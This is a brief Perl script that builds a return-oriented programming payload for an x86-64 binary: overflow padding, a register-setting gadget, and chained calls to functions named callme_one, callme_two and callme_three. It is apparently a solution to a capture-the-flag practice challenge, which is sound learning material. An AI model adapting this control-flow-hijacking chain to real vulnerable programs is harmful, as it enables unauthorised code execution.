$PADDING="B"x40;
$SETREGS="\xb0\x1a\x40\x00\x00\x00\x00\x00" . "\1"."\0"x7 . "\2"."\0"x7 . "\3"."\0"x7; # Set registres with params 1, 2, 3
$CALLME1="\x50\x18\x40\x00\x00\x00\x00\x00"; # reloc.callme_one
$CALLME2="\x76\x18\x40\x00\x00\x00\x00\x00"; # reloc.callme_two
$CALLME3="\x16\x18\x40\x00\x00\x00\x00\x00"; # reloc.callme_three

print $PADDING . $SETREGS . $CALLME1 . $SETREGS . $CALLME2 . $SETREGS . $CALLME3
